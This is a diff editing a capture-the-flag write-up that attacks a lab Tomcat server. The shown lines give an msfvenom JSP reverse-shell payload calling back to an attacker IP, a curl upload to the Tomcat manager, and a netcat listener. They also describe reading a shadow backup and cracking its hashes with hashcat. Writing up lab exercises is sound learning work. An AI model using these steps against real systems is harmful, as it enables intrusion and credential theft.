@@ -39,9 +39,7 @@ Ok, so back to using the standard war exploit, finally :)
 
 - First I created a jsp-based reverse shell with msfvenom: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.108.144 LPORT=4444 -f raw -o revshell.jar`
 - Then I uploaded this using curl: `curl -u <redacted> --upload-file revshell.war http://10.10.104.169:8080/manager/text/deploy?path=/revshell`
-- Finally, by starting a nc listener and navigating to `http://10.10.104.169:8080/revshell`
-
-This got me onto the machine as 'web'.
+- Finally, by starting a nc listener and navigating to `http://10.10.104.169:8080/revshell`, I got onto the machine as 'web'.
 
 From here it was somewhat easy. I ran linpeas, and found a backup file under backups I could read, `shadow-backup-alt.gz`. Unzipping this got me a copy of shadow with the hashes for `web` and the other user, `jdk-admin`. I put these through hashcat with rockyou and `-m 1800` and quickly got the jdk-admin password. In their home directory was the user flag.
 
